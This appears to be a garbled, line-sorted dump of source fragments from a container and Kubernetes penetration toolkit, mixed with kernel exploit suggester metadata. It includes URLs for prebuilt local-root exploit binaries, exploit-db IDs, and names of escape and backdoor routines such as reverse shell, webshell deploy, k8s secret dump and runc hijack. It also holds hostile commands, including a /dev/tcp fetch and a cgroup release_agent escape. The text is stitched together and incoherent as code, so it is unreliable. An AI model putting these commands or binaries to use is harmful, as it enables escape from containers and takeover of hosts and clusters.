author: p0c73n1
author: raptor
author: rebel
author: saleemrashid
author: spender
author: theflow (orginal exploit author)
author: wapiflapi (orginal exploit author)
author: wbowling (orginal exploit author)
author: worawit
available: CONFIG_BPF_SYSCALL=y
available: CONFIG_BUG=y
available: CONFIG_BUG_ON_DATA_CORRUPTION=y
available: CONFIG_DEBUG_CREDENTIALS=y
available: CONFIG_DEBUG_LIST=y
available: CONFIG_DEBUG_NOTIFIERS=y
available: CONFIG_DEBUG_SG=y
available: CONFIG_DEFAULT_MMAP_MIN_ADDR=[0-9]
available: CONFIG_DEVKMEM=y
available: CONFIG_DEVMEM=y
available: CONFIG_FORTIFY_SOURCE=y
available: CONFIG_GRKERNSEC=y
available: CONFIG_HARDENED_USERCOPY=y
available: CONFIG_HAVE_STACKPROTECTOR=y
available: CONFIG_IO_STRICT_DEVMEM=y
available: CONFIG_PAGE_POISONING=y
available: CONFIG_PAX=y
available: CONFIG_RANDOMIZE_BASE=y
available: CONFIG_REFCOUNT_FULL=y
available: CONFIG_SCHED_STACK_END_CHECK=y
available: CONFIG_SECCOMP=y
available: CONFIG_SECURITY_YAMA=y
available: CONFIG_SLAB_FREELIST_HARDENED=y
available: CONFIG_SLAB_FREELIST_RANDOM=y
available: CONFIG_STRICT_DEVMEM=y
available: CONFIG_STRICT_KERNEL_RWX=y
available: CONFIG_STRICT_MODULE_RWX=y
available: CONFIG_USER_NS=y
available: CONFIG_VMAP_STACK=y
available: ver>=3.0
available: ver>=3.7
available: ver>=4.15
bS3ebgob9U8Nd0kOddGdZWjyMGR8Wziv
bin-url: http://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/half-nelson3
bin-url: https://github.com/duasynt/xfrm_poc/raw/master/lucky0
bin-url: https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/CVE-2016-8655/chocobo_root
bin-url: https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/cve-2017-1000112/exploit.out
bin-url: https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/cve-2017-16995/exploit.out
bin-url: https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/cve-2017-7308/exploit
bin-url: https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/cve-2018-1000001/RationalLove
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/elflbl
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/h00lyshit
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/kmod2
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/ptrace-kmod
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/full-nelson
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/full-nelson64
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/memodipper
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/memodipper64
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/ofs_32
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/ofs_64
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/perf_swevent
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/perf_swevent64
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/timeoutpwn64
bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/can_bcm
bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/ptrace_kmod2-64
bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/rds
bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/rds64
bin:
bkYfwYgY
bldblu='
bldwht='
blog$
break
bssh_
buf := new(bytes.Buffer)
buf)
build !no_check_ptrace
build !no_deploy_webshell
build !no_docker_api_pwn
build !no_docker_runc
build !no_docker_sock_check
build !no_docker_sock_pwn
build !no_etcd_get_k8s_token
build !no_file_scan
build !no_image_registry_brute
build !no_istio_check
build !no_k8s_backdoor_daemonset
build !no_k8s_clusterip_mitm
build !no_k8s_configmap_dump
build !no_k8s_cronjob
build !no_k8s_get_sa_token
build !no_k8s_secret_dump
build !no_kubelet_exec
build !no_kubelet_var_log_escape
build !no_mount_device
build !no_mount_procfs
build !no_probe_tool
build !no_reverse_shell
build !no_rewrite_cgroup_devices
build !no_service_probe
build no_probe_tool
build thin no_netcat_tool
build thin no_vi_tool
bzero := base64.StdEncoding.EncodeToString([]byte{0})
c.Close()
c5H38=
cache >>= letterIdxBits
camNLpbua3MAz/GqiVJY=
capStr := strings.TrimSpace(lst[1])
case -1:
case 0:
case 1:
case 23:
case 2:
case 3:
case 4:
case <-result:
case <-time.After(time.Second 
cat < /dev/tcp/(your_public_host_ip)/(port) > cdk
cd ../../cdk_release_binary/ 
cd {}
cdk eva
cdk evaluate [--full]
cdk nc [options]
cdk ps
cdk run
cdk run --list
cdk run <script-name> [options]
cdk-serverless <scan-dir> <remote-ip> <port>
cdk-zero-dependency-container-penetration-toolkit-22422)
cdk-zero-dependency-container-penetration-toolkit-22422](https://www.blackhat.com/asia-21/arsenal/schedule/index.html
checkEnvFirst()
checkRequirement() {
checksecMode() {
chmod 
chmod a
chroot := false
chroot = true
class CDK:
class DEV_PATH:
class K8S:
class SELFBUILD_K8S:
class SERVER:  
cli := goz.NewClient(goz.Options{
cli.ParseCDKMain()
client := 
client := ttrpc.NewClient(conn)
cloud.google.com/go v0.26.0/go.mod h1:aQUYkXzVsufM
clusterId=ca3869bd4dd884799a5abbb00c5e56fc4
cmd    = []string{defaultShell}
cmd := args[0]
cmd := args[1]
cmd := args[3]
cmd := exec.Command(shell)
cmd = '''
cmd = args[2:]
cmd.Run()
cmd.Stderr = 
cmd.Stderr = conn
cmd.Stderr = convert
cmd.Stderr = os.Stderr
cmd.Stdin = conn
cmd.Stdin = convert
cmd.Stdin = os.Stdin
cmd.Stdout = 
cmd.Stdout = conn
cmd.Stdout = convert
cmd.Stdout = os.Stdout
cmd/cdk/cdk
cmd:.
command = shellPath
command=%s
command=-c
command=/bin/sh
comments: Requires a ReiserFS filesystem mounted with extended attributes
community)
community](https://github.com/knownsec/404StarLink2.0-Galaxy
compareValues() {
conn = get_remote_conn()
conn = k8s_get_remote_conn()
conn net.Conn
const (
const Colorful = true
const DefaultFolderPerm = 0755
const sysPtraceCapMask uint64 = 2 << 18
containerID
containerID := params[0]
continue
convert := new(Convert)
convert := newConvert(conn)
convert.conn = c
corePatternFile := procDir 
cron := args[1]
crontabDir := mountedDir 
ctx := context.Background()
curl
curl -s https://192.168.0.234:6443/api/v1/nodes
currentPath := strings.ToLower(path)
current_file=$0
daemon:
data := generateShadowApiServerConf(config)
dcurl
deb8u2}
declare -a EXPLOITS
declare -a EXPLOITS_USERSPACE
declare -a SORTED_EXPLOITS
declare -a exploits_to_sort
def clear_all_env():
def get_remote_conn():
def gox_release():
def k8s_get_remote_conn():
def k8s_pod_upload():
def selfbuild_k8s_pod_upload():
def test():
def test_auto_pwn():
def test_container():
def test_dev():
def test_pod():
def update_remote_bin():
default) (get
default:
default: // err break
defer cmdFile.Close()
defer conn.Close()
defer datafd.Close()
defer f.Close()
defer file.Close()
defer func() {
defer func(c net.Conn) {
defer func(c net.PacketConn) {
defer ps.lock.Release(1)
defer resp.Body.Close()
defer wg.Done()
defer wg.Wait()
deviceMarjor = mi.Major
deviceMinor = mi.Minor
devices = util.RemoveDuplicateElement(devices)
devicesAllow := getDevicesAllow(devicesListPath)
devicesAllowPath := findCurrentCgroupENV()
devicesAllowPath = path
dir      string
displayExposure() {
distinctMap := make(map[string]bool)
distinctMap[item] = true
doParseCDKMainWithTimeout()
doVersionComparision() {
docker
dockerPath := GetDockerAbsPath()
dockerRuncPwn(cmd)
dockerd_api.DcurlToolApi(args)
dockerd_api.UcurlToolApi(args)
done
e := cmd.Run()
e2cm9otk0dWdXHAEo=
e[91
echo
echo ${host_path}/exp.sh > /mnt/cgrp1/release_agent
echo 1 > /mnt/cgrp1/x/notify_on_release
ectl
ectl - Unauthorized enumeration of ectd keys.
else
enabled: cmd: grep 'page_poison=1' /proc/cmdline
enabled: cmd:grep -Eqi '
enabled: cmd:grep -iw Seccomp /proc/self/status 
enabled: cmd:grep -qi smap /proc/cpuinfo
enabled: cmd:grep -qi smep /proc/cpuinfo
enabled: cmd:test -c /dev/grsec
enabled: cmd:test -d /proc/sys/lkrg
enabled: cmd:test -x /sbin/paxctl
enabled: sysctl:kernel.dmesg_restrict!=0
enabled: sysctl:kernel.unprivileged_bpf_disabled!=1
enabled: sysctl:kernel.unprivileged_userns_clone==1
enabled: sysctl:kernel.yama.ptrace_scope!=0
enabled: sysctl:vm.mmap_min_addr!=0
encoding.Register()
end = start
endTime := time.Now()
endpoint    = defaultEndpoint
endpoint = args[1]
engine
err := CheckDockerSock(sock)
err := UnprivUserNS(cmd)
err := cmd.Run()
err := unix.Uname(utsInfo)
err = addProcCmd.Start()
err = fd.Close()
err = ioutil.WriteFile(localBundlePath
err = ioutil.WriteFile(mountPointPath
err = ioutil.WriteFile(releaseAgentPath
err = ioutil.WriteFile(targetDir
err = json.NewDecoder(resp.Body).Decode(
err = nil
err = os.Mkdir(mountPointPath
err = os.Mkdir(targetDir
err = reExecCmd.Run()
err = util.SetBlockAccessible(devicesAllowPath)
err.Error())
errStr = err.Error() 
errStr = stderr.String()
error=1
errors.CDKRuntimeError{
errors.CDKRuntimeError{Err: err})
etcdCa      = defaultEtcdCa
etcdCa = args[4]
etcdCert    = defaultEtcdCert
etcdCert = args[2]
etcdCertKey = args[3]
etcdCertKey = defaultEtcdCertKey
etcdctl.EtcdctlToolApi(args)
evaluate.CallAddedFunc()
evaluate.CallBasics()
excepted white pattern:
exec.Cmd
execCommand(cmd)
exitWithErrMsg() {
expected bool
expectedStdout := 
exploit := CapDacReadSearch{}
exploit := DINDAttackDeployS{}
exploit := DINDAttackS{}
exploit := DockerRemoteAPIS{}
exploit := EtcdGetToken{}
exploit := ExploitCgroupS{}
exploit := ExploitUnprivUserNS{}
exploit := FileScanS{}
exploit := K8SPodSecurityPolicy{}
exploit := K8sBackDoorDaemonsetS{}
exploit := K8sCronJobDeployS{}
exploit := K8sGetSATokenViaCreatePodS{}
exploit := K8sMitmClusteripS{}
exploit := K8sSecretsDumpS{}
exploit := K8sShadowApiServerS{}
exploit := KubeletExec{}
exploit := PidInject{}
exploit := RegistryBruteS{}
exploit := TESTExploit{}
exploit := VarLogEscape{}
exploit := cgroupDevicesExploitS{}
exploit := containerdShimPwnS{}
exploit := dockerRuncPwnS{}
exploit := dumpK8sConfigmapS{}
exploit := istioCheckS{}
exploit := lxcfsRWCgroup{}
exploit := lxcfsRWS{}
exploit := mountDeviceS{}
exploit := mountProcfsExpS{}
exploit := reverseShellS{}
exploit := serviceProbeS{}
exploit := webShellDeployS{}
exploit-db:
exploit-db: 10018
exploit-db: 12130
exploit-db: 1397
exploit-db: 14339
exploit-db: 14814
exploit-db: 15023
exploit-db: 15024
exploit-db: 15150
exploit-db: 15285
exploit-db: 15620
exploit-db: 15704
exploit-db: 15774
exploit-db: 15916
exploit-db: 15944
exploit-db: 160
exploit-db: 17787
exploit-db: 17942
exploit-db: 18411
exploit-db: 18436
exploit-db: 2004
exploit-db: 2005
exploit-db: 2006
exploit-db: 2011
exploit-db: 2013
exploit-db: 2031
exploit-db: 23674
exploit-db: 25444
exploit-db: 25450
exploit-db: 26131
exploit-db: 27297
exploit-db: 31346
exploit-db: 31347
exploit-db: 32926
exploit-db: 33321
exploit-db: 33322
exploit-db: 33516
exploit-db: 33589
exploit-db: 33824
exploit-db: 33899
exploit-db: 34134
exploit-db: 34421
exploit-db: 34923
exploit-db: 36267
exploit-db: 36564
exploit-db: 36746
exploit-db: 36747
exploit-db: 36782
exploit-db: 37089
exploit-db: 37292
exploit-db: 37706
exploit-db: 37722
exploit-db: 38390
exploit-db: 38832
exploit-db: 39166
exploit-db: 39230
exploit-db: 39535
exploit-db: 39549
exploit-db: 40003
exploit-db: 40049
exploit-db: 40450
exploit-db: 40488
exploit-db: 40611
exploit-db: 40678
exploit-db: 40759
exploit-db: 40768
exploit-db: 40839
exploit-db: 40871
exploit-db: 40921
exploit-db: 41173
exploit-db: 41356
exploit-db: 41458
exploit-db: 41994
exploit-db: 41995
exploit-db: 41999
exploit-db: 42183
exploit-db: 42273
exploit-db: 42274
exploit-db: 42275
exploit-db: 42276
exploit-db: 42887
exploit-db: 43775
exploit-db: 45010
exploit-db: 45313
exploit-db: 45886
exploit-db: 45922
exploit-db: 46186
exploit-db: 46361
exploit-db: 46362
exploit-db: 46996
exploit-db: 47009
exploit-db: 47133
exploit-db: 47163
exploit-db: 4756
exploit-db: 48154
exploit-db: 50135
exploit-db: 50808
exploit-db: 5092
exploit-db: 5093
exploit-db: 6851
exploit-db: 744
exploit-db: 778
exploit-db: 8369
exploit-db: 8478
exploit-db: 8572
exploit-db: 9435
exploit-db: 9436
exploit-db: 9479
exploit-db: 9542
exploit-db: 9545
exploit-db: 9574
exploit-db: 9575
exploit-db: 9641
exploit-db: https://www.exploit-db.com/exploits/41154
exploitSubSys = v.ControllerLst
exploitSuccess = true
export GOTRACEBACK=crash
ext-url: https://github.com/bcoles/local-exploits/raw/master/CVE-2019-18862/exploit.cron.sh
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2018-5333/cve-2018-5333.c
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
ext-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh
ext-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-12181/SUroot
ext-url: https://www.exploit-db.com/download/40847
f65V22dbkXbowE6jgT/gNBxE=
f9T1iT9GByDxfZKAQTCR3kQA=
fabric
fdisk
feature: Additional 'cred' struct checks
feature: Allocator validation checking
feature: BUG() conditions reporting
feature: Checks for a stack overrun on calls to 'schedule'
feature: Checks for data structure corruptions
feature: Checks on scatter-gather tables
feature: Extended checks for linked-lists walking
feature: Freelist metadata hardening
feature: Freelist order randomization on new pages creation
feature: GCC stack protector STRONG support
feature: GCC stack protector support
feature: Grsecurity
feature: Hardened user copy support
feature: Hardening common str/mem functions against buffer overflows
feature: Kernel Page Table Isolation (PTI) support
feature: Linux Kernel Runtime Guard (LKRG) kernel module
feature: Low address space to protect from user allocation
feature: Make kernel text and rodata read-only
feature: PaX
feature: Pages poisoning after free_pages() call
feature: Prevent users from using ptrace to examine the memory and state of their processes
feature: Randomize the address of the kernel image (KASLR)
feature: Restrict /dev/mem access
feature: Restrict I/O access to /dev/mem
feature: Restrict unprivileged access to kernel syslog
feature: Sanity checks for notifier call chains
feature: Set loadable kernel module data as NX and text as RO
feature: Supervisor Mode Access Prevention (SMAP) support
feature: Supervisor Mode Execution Protection (SMEP) support
feature: Support for /dev/kmem access
feature: Support for /dev/mem access
feature: Syscalls filtering
feature: Unprivileged access to bpf() system call
feature: User namespaces for unprivileged accounts
feature: Using 'refcount_t' instead of 'atomic_t'
feature: Virtually-mapped kernel stacks with guard pages
fields := strings.Fields(parts[0])
fields = strings.Fields(parts[1])
file.Close()
file> <password
fileType := args[0]
filterString = args[0]
find /bin/. -perm -4000 -type f 
flag := numb 
flag = true
flag.BoolVar(
flag.IntVar(
flag.Parse()
flag.PrintDefaults()
flag.StringVar(
flag.Usage = usage
flag.Usage()
fmt.Printf(BannerHeader)
fmt.Printf(RedBold.Sprint(value))
fmt.Printf(value)
fmt.Println()
fmt.Println(ans)
fmt.Println(ectlBanner)
fmt.Println(err)
fmt.Println(err.Error())
fmt.Println(expShellText)
fmt.Println(exploit.Desc())
fmt.Println(fstring)
fmt.Println(json)
fmt.Println(kcurlBanner)
fmt.Println(m.String())
fmt.Println(mountedDirs)
fmt.Println(pids)
fmt.Println(podName[1])
fmt.Println(res.ToJson())
fmt.Println(resp)
fmt.Println(respSvc)
fmt.Println(result)
fmt.Println(string(content))
fmt.Println(string(data))
fmt.Println(string(name))
fmt.Println(string(out))
fmt.Println(string(raw))
fmt.Println(string(v))
for handleFd == -1 {
for i := 0
for i := index
for input.Scan() {
for ipExt := start
for k := range keys {
for k := range res {
for port := p.From
for sc.Scan() {
for scanner.Scan() {
for {
found = fint
found AWS API Key in: ../../test/scan_file_text/xxx/2.txt
found RSA private key in: ../../test/scan_file_text/1
found RSA private key in: ../../test/scan_file_text/xxx/2.txt
found Twilio API Key in: ../../test/scan_file_text/xxx/2.txt
from := 0
from fabric import Connection
from invoke import UnexpectedExit
from invoke.exceptions import UnexpectedExit
from lib.conf import CDK
from lib.ssh_remote_action import check_host_evaluate
from lib.ssh_remote_action import check_host_exec
from lib.ssh_remote_action import inside_container_cmd
from lib.ssh_remote_action import output_err
from lib.ssh_remote_action import update_remote_bin
fromImage=alpine
fstring := string(fbytes)
func (b BaseExploit) GetExploitType() string {
func (convert 
func (e 
func (exp ExploitUnprivUserNS) Desc() string {
func (exp ExploitUnprivUserNS) Run() bool {
func (l 
func (l lxcfsRWCgroup) Desc() string {
func (l lxcfsRWCgroup) Run() bool {
func (l lxcfsRWS) Desc() string {
func (l lxcfsRWS) Run() bool {
func (mi MountInfo) String() string {
func (p CapDacReadSearch) Desc() string {
func (p CapDacReadSearch) Run() bool {
func (p DINDAttackDeployS) Desc() string {
func (p DINDAttackDeployS) Run() bool {
func (p DINDAttackS) Desc() string {
func (p DINDAttackS) Run() bool {
func (p DockerRemoteAPIS) Desc() string {
func (p DockerRemoteAPIS) Run() bool {
func (p EtcdGetToken) Desc() string {
func (p EtcdGetToken) Run() bool {
func (p ExploitCgroupS) Desc() string {
func (p ExploitCgroupS) Run() bool {
func (p FileScanS) Desc() string {
func (p FileScanS) Run() bool {
func (p K8SPodSecurityPolicy) Desc() string {
func (p K8SPodSecurityPolicy) Run() bool {
func (p K8sBackDoorDaemonsetS) Desc() string {
func (p K8sBackDoorDaemonsetS) Run() bool {
func (p K8sCronJobDeployS) Desc() string {
func (p K8sCronJobDeployS) Run() bool {
func (p K8sGetSATokenViaCreatePodS) Desc() string {
func (p K8sGetSATokenViaCreatePodS) Run() bool {
func (p K8sMitmClusteripS) Desc() string {
func (p K8sMitmClusteripS) Run() bool {
func (p K8sSecretsDumpS) Desc() string {
func (p K8sSecretsDumpS) Run() bool {
func (p K8sShadowApiServerS) Desc() string {
func (p K8sShadowApiServerS) Run() bool {
func (p KubeletExec) Desc() string {
func (p KubeletExec) Run() bool {
func (p PidInject) Desc() string {
func (p PidInject) Run() bool {
func (p RegistryBruteS) Desc() string {
func (p RegistryBruteS) Run() bool {
func (p TESTExploit) Desc() string {
func (p TESTExploit) Run() bool {
func (p VarLogEscape) Desc() string {
func (p VarLogEscape) Run() bool {
func (p cgroupDevicesExploitS) Desc() string {
func (p cgroupDevicesExploitS) Run() bool {
func (p containerdShimPwnS) Desc() string {
func (p containerdShimPwnS) Run() bool {
func (p dockerRuncPwnS) Desc() string {
func (p dockerRuncPwnS) Run() bool {
func (p dumpK8sConfigmapS) Desc() string {
func (p dumpK8sConfigmapS) Run() bool {
func (p istioCheckS) Desc() string {
func (p istioCheckS) Run() bool {
func (p mountDeviceS) Desc() string {
func (p mountDeviceS) Run() bool {
func (p mountProcfsExpS) Desc() string {
func (p mountProcfsExpS) Run() bool {
func (p reverseShellS) Desc() string {
func (p reverseShellS) Run() bool {
func (p serviceProbeS) Desc() string {
func (p serviceProbeS) Run() bool {
func (p taskAutoEscapeS) Desc() string {
func (p taskAutoEscapeS) Exec() bool {
func (p webShellDeployS) Desc() string {
func (p webShellDeployS) Run() bool {
func (ps 
func (res Result) PrintJson() {
func (res Result) ToJson() string {
func ASLR() {
func BasicSysInfo() {
func ByteToString(orig []byte) string {
func CallAddedFunc() {
func CallBasics() {
func CapHexToText(capHex string) string {
func CapListToString(lst []string) string {
func CheckCloudMetadataAPI() {
func CheckDebugfs() bool {
func CheckDockerRemoteAPI(url string) bool {
func CheckDockerSock(path string) error {
func CheckFdisk() {
func CheckK8sAnonymousLogin() bool {
func CheckNetNamespace() {
func CheckPidInject() bool {
func CheckPrivilegedK8sServiceAccount(tokenPath string) bool {
func CheckRouteLocalNetworkValue() {
func CheckUnpriUserNS() error {
func CommandAllow() {
func DNSBasedServiceDiscovery() {
func DcurlToolApi(args []string) {
func DistinctStrArr(s []string) []string {
func DumpCgroup() {
func EtcdctlToolApi(args []string) {
func ExploitLXCFS() bool {
func ExploitLXCFSCgroup() bool {
func FileExist(path string) bool {
func FindDir(path string) string {
func FindReleaseAgentSubSystem() string {
func FindSidFiles() {
func FindTargetDeviceID(mi 
func GenerateQuery(key string) (query string) {
func GetDockerAbsPath() string {
func GetLocalAddresses() {
func GetNamespaces(serverAddr string) string {
func GetNodes(serverAddr string) string {
func GetProcCapabilities() bool {
func IsDir(FilePath string) bool {
func IsDir(path string) bool {
func IsDirectory(path string) bool {
func IsSoftLink(FilePath string) bool {
func KubectlToolApi(args []string) {
func ListAllExploit() {
func MountEscape() {
func New(text string) error {
func NewStdoutWrapper() 
func ParseCDKMain() bool {
func PassInnerArgs() {
func PrintH2(title string) {
func PrintOrignal(out string) {
func RandString(n int) string {
func RemoveDuplicateElement(addrs []string) []string {
func ReverseShell(connectString string) {
func RunNetstat() {
func RunPs() {
func RunSingleExploit(name string) {
func RunSingleTask(name string) {
func RunVendorNetcat() {
func RunVendorVi() {
func SearchAvailableCommands() {
func SearchLocalFilePath() {
func SearchLocalFileText(StartDir string) {
func SearchSensitiveEnv() {
func SearchSensitiveService() {
func SecurityInfo() {
func SetBlockAccessible(path string) error {
func ShellExec(shellPath string) error {
func TCPScanExploitAPI(ipRange string) {
func TestBlankInString(t 
func TestCapHexParser(t 
func TestCheckPidInject(t 
func TestCheckSysPtraceCap(t 
func TestDumpCgroup(t 
func TestFindSidFiles(t 
func TestGetTaskPortListByString(t 
func TestIsDir(t 
func TestIsSoftLink(t 
func TestKernelExploitSuggester(t 
func TestNormalizeInput(t 
func TestParseCDKMain(t 
func TestSearchLocalFileText(t 
func TestWriteString(t 
func UcurlToolApi(args []string) {
func Ulimit() int64 {
func UnprivUserNS(cmd string) error {
func autoEscape(shellCommand string) bool {
func captureStdout(f func()) string {
func checkClose(c io.Closer) {
func checkEnvFirst() {
func doParseCDKMainWithTimeout() {
func dockerRuncPwn(hijackCommand string) {
func dumpK8sConfigmapAnonymous(serverAddr string) string {
func dumpK8sSecretsAnonymous(serverAddr string) string {
func enableSysPtraceCap(mask uint64) bool {
func execCommand(cmdSlice []string) {
func extractKubectl() string {
func findCurrentCgroupENV() string {
func findDevicesAllowPath(mi 
func findHostPath(mountInfos []util.MountInfo) (hostPath string) {
func findTargetMountPoint(mi 
func generateShadowApiServerConf(json string) string {
func getAddCaps(currentCaps []string) []string {
func getDaemonsetApi(apiVersion string) string {
func getDevicesAllow(path string) string {
func helpMsg() {
func init() {
func kernelExploitSuggester() {
func main() {
func newConvert(c net.Conn) 
func newDevicesCgroup(filePreString string) error {
func normalizeInput(input string) []string {
func parseArgs() {
func parseDocopt() {
func triggerSegmentFault() {
func usage() {
getKernelConfig() {
getPkgList() {
github.com/BurntSushi/toml v0.3.1/go.mod h1:xHWCNGjB5oqiDr8zfno3MHue2Ht5sIBksp03qcyfWMU=
github.com/StackExchange/wmi v0.0.0-20190523213315-cbe66965904d h1:G0m3OIz70MZUWq3EgK3CesDbo8upS2Vm9/P3FtgI
github.com/StackExchange/wmi v0.0.0-20190523213315-cbe66965904d/go.mod h1:3eOhrUMpNV
github.com/axgle/mahonia v0.0.0-20180208002826-3358181d7394
github.com/axgle/mahonia v0.0.0-20180208002826-3358181d7394 h1:OYA
github.com/axgle/mahonia v0.0.0-20180208002826-3358181d7394/go.mod h1:Q8n74mJTIgjX4RBBcHnJ05h//6/k6foqmgE45jTQtxg=
github.com/bkthomps/Ven v0.5.0
github.com/bkthomps/Ven v0.5.0 h1:D1G6040KiZCDnaJiEXV1JJHL
github.com/bkthomps/Ven v0.5.0/go.mod h1:MbAlMSlEjHVmhO3V8eKApqRiJ4MyxCN8MRYtbVHA1E0=
github.com/census-instrumentation/opencensus-proto v0.2.1/go.mod h1:f6KPmirojxKA12rnyqOA5BBL4O983OfeGPqjHWSTneU=
github.com/client9/misspell v0.3.4/go.mod h1:qj6jICC3Q7zFZvVWo7KLAzC3yx5G7kyvSDkc90ppPyw=
github.com/containerd/containerd v1.4.3
github.com/containerd/containerd v1.4.3 h1:ijQT13JedHSHrQGWFcGEwzcNKrAGIiZ
github.com/containerd/containerd v1.4.3/go.mod h1:bC6axHOhabU15QhwfG7w5PipXdVtMXFTttgp
github.com/containerd/ttrpc v1.0.2
github.com/containerd/ttrpc v1.0.2 h1:2/O3oTZN36q2xRolk0a2WWGgh7/Vf/liElg5hFYLX9U=
github.com/containerd/ttrpc v1.0.2/go.mod h1:UAxOpgT9ziI0gJrmKvgcZivgxOp8iFPSk8httJEt98Y=
github.com/davecgh/go-spew v1.1.0/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI
github.com/davecgh/go-spew v1.1.1 h1:vj9j/u1bqnvCEfJOwUhtlOARqs3
github.com/davecgh/go-spew v1.1.1/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI
github.com/docopt/docopt-go v0.0.0-20180111231733-ee0de3bc6815
github.com/docopt/docopt-go v0.0.0-20180111231733-ee0de3bc6815 h1:bWDMxwH3px2JBh6AyO7hdCn/PkvCZXii8TGj7sbtEbQ=
github.com/docopt/docopt-go v0.0.0-20180111231733-ee0de3bc6815/go.mod h1:WwZ
github.com/envoyproxy/go-control-plane v0.9.1-0.20191026205805-5f8ba28d4473/go.mod h1:YTl/9mNaCwkRvm6d1a2C3ymFceY/DCBVvsKhRF0iEA4=
github.com/envoyproxy/protoc-gen-validate v0.1.0/go.mod h1:iSmxcyjqTsJpI2R4NaDN7
github.com/fatih/color v1.13.0
github.com/fatih/color v1.13.0 h1:8LOYc1KYPPmyKMuN8QV2DNRWNbLo6LZ0iLs8
github.com/fatih/color v1.13.0/go.mod h1:kLAiJbzzSOZDVNGyDpeOxJ47H46qBXwg5ILebYFFOfk=
github.com/gdamore/encoding v1.0.0 h1:
github.com/gdamore/encoding v1.0.0/go.mod h1:alR0ol34c49FCSBLjhosxzcPHQbf2trDkoo5dl
github.com/gdamore/tcell v1.4.0
github.com/gdamore/tcell v1.4.0 h1:vUnHwJRvcPQa3tzi
github.com/gdamore/tcell v1.4.0/go.mod h1:vxEiSDZdW3L
github.com/go-ole/go-ole v1.2.4 h1:nNBDSCOigTSiarFpYE9J/KtEA1IOW4CNeqT9TQDqCxI=
github.com/go-ole/go-ole v1.2.4/go.mod h1:XCwSNxSkXRo4vlyPy93sltvi/qJq0jqQhjqQNIwKuxM=
github.com/gogo/protobuf v1.3.1/go.mod h1:SlYgWuQ5SjCEi6WLHjHCa1yvBfUnHcTbrrZtXPKa29o=
github.com/gogo/protobuf v1.3.2 // indirect
github.com/gogo/protobuf v1.3.2 h1:Ov1cvc58UF3b5XjBnZv7
github.com/gogo/protobuf v1.3.2/go.mod h1:P1XiOD3dCwIKUDQYPy72D8LYyHL2YPYrpS2s69NZV8Q=
github.com/golang/glog v0.0.0-20160126235308-23def4e6c14b h1:VKtxabqXZkF25pY9ekfRL6a582T4P37/31XEstQ5p58=
github.com/golang/glog v0.0.0-20160126235308-23def4e6c14b/go.mod h1:SBH7ygxi8pfUlaOkMMuAQtPIUF8ecWP5IEl/CR7VP2Q=
github.com/golang/mock v1.1.1/go.mod h1:oTYuIxOrZwtPieC
github.com/golang/protobuf v1.2.0/go.mod h1:6lQm79b
github.com/golang/protobuf v1.3.2 h1:6nsPYzhq5kReh6QImI3k5qWzO4PEbvbIW2cwSfR/6xs=
github.com/golang/protobuf v1.3.2/go.mod h1:6lQm79b
github.com/google/go-cmp v0.2.0/go.mod h1:oXzfMopK8JAjlY9xF4vHSVASa0yLyX7SntLO5aqRK0M=
github.com/google/go-cmp v0.5.4 // indirect
github.com/google/go-cmp v0.5.4 h1:L8R9j
github.com/google/go-cmp v0.5.4/go.mod h1:v8dTdLbMG2kIc/vJvl
github.com/hashicorp/go-version v1.3.0
github.com/hashicorp/go-version v1.3.0 h1:McDWVJIU/y
github.com/hashicorp/go-version v1.3.0/go.mod h1:fltr4n8CU8Ke44wwGCBoEymUuxUHl09ZGVZPK5anwXA=
github.com/idoubi/goz v1.0.0
github.com/idoubi/goz v1.0.0 h1:UDMN22ahjlKIeiU
github.com/idoubi/goz v1.0.0/go.mod h1:TKB1zGu6hYQ1A4TPr3v/DiI50jNfe9mSUIXHxWSQiHg=
github.com/kisielk/errcheck v1.2.0/go.mod h1:/BMXB
github.com/kisielk/errcheck v1.5.0/go.mod h1:pFxgyoBC7bSaBwPgfKdkLd5X25qrDl4LWUI2bnpBCr8=
github.com/kisielk/gotool v1.0.0/go.mod h1:XhKaO
github.com/konsorten/go-windows-terminal-sequences v1.0.1/go.mod h1:T0
github.com/konsorten/go-windows-terminal-sequences v1.0.2/go.mod h1:T0
github.com/kr/pretty v0.2.1 // indirect
